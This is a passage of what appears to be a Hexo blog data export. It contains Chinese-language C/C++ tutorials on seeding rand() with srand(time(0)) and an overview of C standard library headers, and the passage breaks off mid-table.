endl;\n}\n```\n\n两次运行结果一致，这是为什么呢？因为我们两次调用srand()函数设置随机数种子之间的时间间隔不超过1s，这会导致我们重置随机数种子，从而等价于使用了一个固定的随机数种子。我们可以用下面的代码来进行验证：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\ncout << \"--------------\" << endl;\nsleep(1.0);\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\n```\n\n为什么要特意指出这一点？这是为了防止我们不小心将srand(time(0))放入了随机数生成循环中：\n\n```c++\nfor(int i = 0; i < 10; i++)\n{\n    srand(time(0));\n    cout << rand() << endl;\n}\n```\n\n 如果，我们在其中引入sleep(1.0)，那么将没有问题：\n\n```c++\nfor(int i = 0; i < 10; i++)\n{\n    srand(time(0));\n    cout << rand() << endl;\n    sleep(1.0);\n}\n```\n\n！！！φ(゜▽゜*)♪~~~\n\n","source":"_posts/c-rand&srand.md","raw":"---\ntitle: 每日学说话(●'◡'●)c-rand\n---\n\n# c--rand()与srand()\n\n### 引子\n\n​    相信大家对于rand()函数并不陌生，我们常用它来生成伪随机数，但是为什么有时候我们生成的随机数并不符合预期呢？或者说，为什么有时候我们生成的随机数并不随机？如何有效地生成伪随机数呢？\n\n### rand()\n\n    rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。\n    rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。如果我们想要生成一个在区间[0, 1]之内的数，那么我们可以写出如下代码：rand_num = rand()/RAND_MAX;\n\n```c++\n#include<iostream>\nusing namespace std;\nint main() {\n\tfor (int i = 0; i < 10; i++)\n\t{\n\t\tcout << rand() << endl;\n\t}\n\treturn 0;\n\tsystem(\"pause\");\n}\n```\n\n### srand()\n\n srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。下面我们来进行实验，从而对它进行更深入的感知。\n\n```c++\n#include<iostream>\nusing namespace std;\nint main() {\n\tsrand(1);\n\tfor(int i = 0; i < 10; i++)\n\t{\n    \tcout << rand() << endl;\n\t}\n\treturn 0;\n\tsystem(\"pause\");\n}\n```\n\n​\t这与我们前面不使用srand()设置随机种子时结果一致，因此我们可以看出，如果我们不显示调用srand()的话，将默认为srand(1)。此外，从这次实验中可以看出，如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。\n​        那我们如何引入变化的种子呢？一般来说，我们会使用time(NULL)或time(0)来表示变化的种子，time(0)的返回的是从1970 UTC Jan 1 00:00到当前时刻的秒数，为unsigned int类型。当我们在不同时刻运行程序时，就会有不同的随机数种子，因此就可以得到不同的结果：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\n```\n\n​\t值得注意的是，如果，我们两次程序运行之间的间隔小于1s，那么会出现下面这种情形（我们通过在代码中两次调用srand(time(0))来模仿这种情形）：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\ncout << \"--------------\" << endl;\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\n```\n\n两次运行结果一致，这是为什么呢？因为我们两次调用srand()函数设置随机数种子之间的时间间隔不超过1s，这会导致我们重置随机数种子，从而等价于使用了一个固定的随机数种子。我们可以用下面的代码来进行验证：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\ncout << \"--------------\" << endl;\nsleep(1.0);\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\n```\n\n为什么要特意指出这一点？这是为了防止我们不小心将srand(time(0))放入了随机数生成循环中：\n\n```c++\nfor(int i = 0; i < 10; i++)\n{\n    srand(time(0));\n    cout << rand() << endl;\n}\n```\n\n 如果，我们在其中引入sleep(1.0)，那么将没有问题：\n\n```c++\nfor(int i = 0; i < 10; i++)\n{\n    srand(time(0));\n    cout << rand() << endl;\n    sleep(1.0);\n}\n```\n\n！！！φ(゜▽゜*)♪~~~\n\n","slug":"c-rand&srand","published":1,"date":"2021-06-22T10:47:20.193Z","updated":"2021-06-24T12:43:08.920Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n900000rouv95676ggs","content":"<h1 id=\"c–rand-与srand\"><a href=\"#c–rand-与srand\" class=\"headerlink\" title=\"c–rand()与srand()\"></a>c–rand()与srand()</h1><h3 id=\"引子\"><a href=\"#引子\" class=\"headerlink\" title=\"引子\"></a>引子</h3><p>​    相信大家对于rand()函数并不陌生，我们常用它来生成伪随机数，但是为什么有时候我们生成的随机数并不符合预期呢？或者说，为什么有时候我们生成的随机数并不随机？如何有效地生成伪随机数呢？</p>\n<h3 id=\"rand\"><a href=\"#rand\" class=\"headerlink\" title=\"rand()\"></a>rand()</h3><pre><code>rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。\nrand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。如果我们想要生成一个在区间[0, 1]之内的数，那么我们可以写出如下代码：rand_num = rand()/RAND_MAX;\n</code></pre>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"srand\"><a href=\"#srand\" class=\"headerlink\" title=\"srand()\"></a>srand()</h3><p> srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。下面我们来进行实验，从而对它进行更深入的感知。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">srand</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">    \tcout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这与我们前面不使用srand()设置随机种子时结果一致，因此我们可以看出，如果我们不显示调用srand()的话，将默认为srand(1)。此外，从这次实验中可以看出，如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。<br>​        那我们如何引入变化的种子呢？一般来说，我们会使用time(NULL)或time(0)来表示变化的种子，time(0)的返回的是从1970 UTC Jan 1 00:00到当前时刻的秒数，为unsigned int类型。当我们在不同时刻运行程序时，就会有不同的随机数种子，因此就可以得到不同的结果：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    值得注意的是，如果，我们两次程序运行之间的间隔小于1s，那么会出现下面这种情形（我们通过在代码中两次调用srand(time(0))来模仿这种情形）：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cout &lt;&lt; <span class=\"string\">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两次运行结果一致，这是为什么呢？因为我们两次调用srand()函数设置随机数种子之间的时间间隔不超过1s，这会导致我们重置随机数种子，从而等价于使用了一个固定的随机数种子。我们可以用下面的代码来进行验证：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cout &lt;&lt; <span class=\"string\">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">1.0</span>);</span><br><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为什么要特意指出这一点？这是为了防止我们不小心将srand(time(0))放入了随机数生成循环中：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 如果，我们在其中引入sleep(1.0)，那么将没有问题：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">    <span class=\"built_in\">sleep</span>(<span class=\"number\">1.0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>！！！φ(゜▽゜*)♪~~~</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"c–rand-与srand\"><a href=\"#c–rand-与srand\" class=\"headerlink\" title=\"c–rand()与srand()\"></a>c–rand()与srand()</h1><h3 id=\"引子\"><a href=\"#引子\" class=\"headerlink\" title=\"引子\"></a>引子</h3><p>​    相信大家对于rand()函数并不陌生，我们常用它来生成伪随机数，但是为什么有时候我们生成的随机数并不符合预期呢？或者说，为什么有时候我们生成的随机数并不随机？如何有效地生成伪随机数呢？</p>\n<h3 id=\"rand\"><a href=\"#rand\" class=\"headerlink\" title=\"rand()\"></a>rand()</h3><pre><code>rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。\nrand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。如果我们想要生成一个在区间[0, 1]之内的数，那么我们可以写出如下代码：rand_num = rand()/RAND_MAX;\n</code></pre>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"srand\"><a href=\"#srand\" class=\"headerlink\" title=\"srand()\"></a>srand()</h3><p> srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。下面我们来进行实验，从而对它进行更深入的感知。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">srand</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">    \tcout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这与我们前面不使用srand()设置随机种子时结果一致，因此我们可以看出，如果我们不显示调用srand()的话，将默认为srand(1)。此外，从这次实验中可以看出，如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。<br>​        那我们如何引入变化的种子呢？一般来说，我们会使用time(NULL)或time(0)来表示变化的种子，time(0)的返回的是从1970 UTC Jan 1 00:00到当前时刻的秒数，为unsigned int类型。当我们在不同时刻运行程序时，就会有不同的随机数种子，因此就可以得到不同的结果：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    值得注意的是，如果，我们两次程序运行之间的间隔小于1s，那么会出现下面这种情形（我们通过在代码中两次调用srand(time(0))来模仿这种情形）：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cout &lt;&lt; <span class=\"string\">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两次运行结果一致，这是为什么呢？因为我们两次调用srand()函数设置随机数种子之间的时间间隔不超过1s，这会导致我们重置随机数种子，从而等价于使用了一个固定的随机数种子。我们可以用下面的代码来进行验证：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cout &lt;&lt; <span class=\"string\">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">1.0</span>);</span><br><span class=\"line\"><span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为什么要特意指出这一点？这是为了防止我们不小心将srand(time(0))放入了随机数生成循环中：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 如果，我们在其中引入sleep(1.0)，那么将没有问题：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">rand</span>() &lt;&lt; endl;</span><br><span class=\"line\">    <span class=\"built_in\">sleep</span>(<span class=\"number\">1.0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>！！！φ(゜▽゜*)♪~~~</p>\n"},{"_content":"标准头文件包括：\n\n*<asset.h>   <ctype.h>    <errno.h>    <float.h>* \n\n*<limits.h>    <locale.h>    <math.h>    <setjmp.h>* \n\n*<signal.h>   <stdarg.h>   <stddef.h>   <stdlib.h>*\n\n*<stdio.h>   <string.h>    <time.h>*\n\n****\\*一、标准定义（\\**\\**\\*<stddef.h>\\*\\**\\**）\\***** \n\n  文件<stddef.h>里包含了标准库的一些常用定义，无论我们包含哪个标准头文件，<stddef.h>都会被自动包含进来。\n\n  这个文件里定义：\n\n l  类型size_t  （sizeof运算符的结果类型，是某个无符号整型）；\n\n l  类型ptrdiff_t（两个指针相减运算的结果类型，是某个有符号整型）；\n\n l  类型wchar_t （宽字符类型，是一个整型，其中足以存放本系统所支持的所有本地环境中的字符集的所有编码值。这里还保证空字符的编码值为0）；\n\n  l  符号常量NULL （空指针值）；\n\n l  宏offsetor  （这是一个带参数的宏，第一个参数应是一个结构类型，第二个参数应是结构成员名。\n\n​          offsetor(s,m)求出成员m在结构类型t的变量里的偏移量）。\n\n  注：其中有些定义也出现在其他头文件里（如NULL）。\n\n### **二、错误信息（\\*<errno.h>\\*）**\n\n   <errno.h>定义了一个*int*类型的表达式*errno*，可以看作一个变量，其初始值为*0*，一些标准库函数执行中出错时将它设为非*0*值，但任何标准库函数都设置它为*0*。\n\n   *<errno.h>*里还定义了两个宏*EDOM*和*ERANGE*，都是非*0*的整数值。数学函数执行中遇到参数错误，就会将*errno*置为*EDOM*，如出现值域错误就会将*errno*置为*ERANGE*。\n\n### **三、输入输出函数（\\*<stdio.h>\\*）**\n\n***\\**\\*文件打开和关闭：\\*\\**\\***\n\n   *FILE \\*fopen(const char \\*filename, const char \\*mode);*\n\n   *int fclose(FILE \\* stream);*\n\n***\\**\\*字符输入输出：\\*\\**\\***\n\n   *int fgetc(FILE \\*fp);*\n\n   *int fputc(int c, FILE \\*fp);*\n\n  getc和putc与这两个函数类似，但通过宏定义实现。通常有下面定义：\n\n   *#define getchar() getc(stdin)*\n\n   *#define putchar(c) putc(c, stdout)*\n\n   *int ungetc(int c, FILE\\* stream);//把字符 c 退回流 stream*\n\n***\\**\\*格式化输入输出：\\*\\**\\***\n\n   *int scanf(const char \\*format, ...);*\n\n   *int printf(const char \\*format, ...);*\n\n   *int fscanf(FILE \\*stream, const char \\*format, ...);*\n\n   *int fprintf(FILE \\*stream, const char \\*format, ...);*\n\n   *int sscanf(char \\*s, const char \\*format, ...);*\n\n   *int sprintf(char \\*s, const char \\*format, ...);*\n\n***\\**\\*行式输入输出：\\*\\**\\***\n\n   *char \\*fgets(char \\*buffer, int n, FILE \\*stream);*\n\n   *int fputs(const char \\*buffer, FILE \\*stream);*\n\n   *char \\*gets(char \\*s);*\n\n   *int puts(const char \\*s);*\n\n***\\**\\*直接输入输出：\\*\\**\\***\n\n   *size_t fread(void \\*pointer, size_t size,* *size_t num, FILE \\*stream);*\n\n   *size_t fwrite(const void \\*pointer, size_t size,* *size_t num, FILE \\*stream);*\n\n \n\n***\\**\\*四、数学函数（\\*\\*\\*\\*\\*<math.h>\\*\\*\\*\\*\\*）\\*\\**\\***\n\n三角函数：\n\n \n\n| 三角函数   | sin  | cos  | tan  |\n| ---------- | ---- | ---- | ---- |\n| 反三角函数 | asin | acos | atan |\n| 双曲函数   | sinh | cosh | tanh |\n\n指数和对数函数：\n\n \n\n| 以*e*为底的指数函数  | exp   |\n| -------------------- | ----- |\n| 自然对数函数         | log   |\n| 以*10*为底的对数函数 | log10 |\n\n其他函数：\n\n \n\n| 平方根                                 | sqrt                        |\n| -------------------------------------- | --------------------------- |\n| 绝对值                                 | fabs                        |\n| 乘幂，第一个参数作为底，第二个是指数   | double pow(double, double)  |\n| 实数的余数，两个参数分别是被除数和除数 | double fmod(double, double) |\n\n注：所有上面未给出类型特征的函数都取一个参数，其参数与返回值都是double类型。\n\n下面函数返回双精度值（包括函数ceil和floor）。在下表里，除其中有特别说明的参数之外，所有函数的其他参数都是double类型。\n\n \n\n| 函数原型            | 意义解释                                                     |\n| ------------------- | ------------------------------------------------------------ |\n| ceil(x)             | 求出不小于**x**的最小整数（返回与这个整数对应的double值）    |\n| floor(x)            | 求出不大于**x**的最大整数（返回与这个整数对应的double值）    |\n| 